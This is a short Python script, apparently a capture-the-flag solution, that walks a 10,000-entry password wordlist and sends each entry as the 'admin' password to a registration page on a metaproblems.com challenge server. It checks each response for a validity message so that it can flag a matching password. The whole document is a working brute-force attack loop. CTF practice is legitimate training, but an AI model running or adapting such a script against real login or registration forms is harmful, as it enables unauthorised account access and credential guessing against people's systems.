from requests import post

URL = "http://icc.metaproblems.com:5750/register.php"

# Open file 10k.txt
with open("10k.txt", "r") as f:
    # Read each line
    for line in f:
        # Send POST request
        r = post(URL, data={"username": "admin", "password": line.strip(), "submit": "submit"})
        # Check if the response contains "Invalid"
        if "Unfortunately, our site is no longer accepting registrations. Please try again later. Your password was valid though." not in r.text:
            print("[+] Found password: " + line.strip())
        